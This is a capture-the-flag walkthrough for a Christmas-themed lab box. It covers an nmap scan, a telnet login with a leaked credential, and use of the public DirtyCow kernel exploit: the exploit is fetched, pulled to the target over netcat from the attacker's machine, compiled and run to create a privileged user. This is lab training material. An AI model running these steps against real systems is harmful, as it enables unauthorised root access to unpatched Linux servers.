# Coal for Christmas

- Hi Santa, hop in your sleigh and deploy this machine!

	no answer needed

- nmap <TARGET_IP>

	no answer needed

	- `nmap <TARGET_IP>`

- What old, deprecated protocol and service is running?

	- `telnet`

- What credential was left for you?

	- `telnet <TARGET_IP> 23`
	- `clauschristmas`

- What distribution of Linux and version number is this server running?

	- `uname -a`
	- `Ubuntu 12.04`

- Who got here first?

	- `cat cookies_and_milk.txt`
	- `grinch`

- This cookies_and_milk.txt file looks like a modified rendition of a DirtyCow exploit, usually written in C. Find a copy of that original file online, and get it on the target box. You can do this with some simple file transfer methods like netcat, or spinning up a quick Python HTTP server... or you can simply copy-and-paste it into a text editor on the box!

	no answer needed

	- [dirtycow](https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c)
	- On your machine `nc -lnvp 4444 < dirty.c`
	- On target `nc -w 3 <YOUR_IP> 4444 > dirty.c`
	
- What is the verbatim syntax you can use to compile, taken from the real C source code comments?

	- `gcc -pthread dirty.c -o dirty -lcrypt`

- Run the commands to compile the exploit, and run it.
What "new" username was created, with the default operations of the real C source code?

	- `./dirty` and then enter the password you've chosen
	- `firefart`

- What is the MD5 hash output?

	- `cat message_from_the_grinch.txt`
	- `touch coal`
	- `tree | md5sum`
	- `8b1**00dd******adb02**********cc`




### see you ...
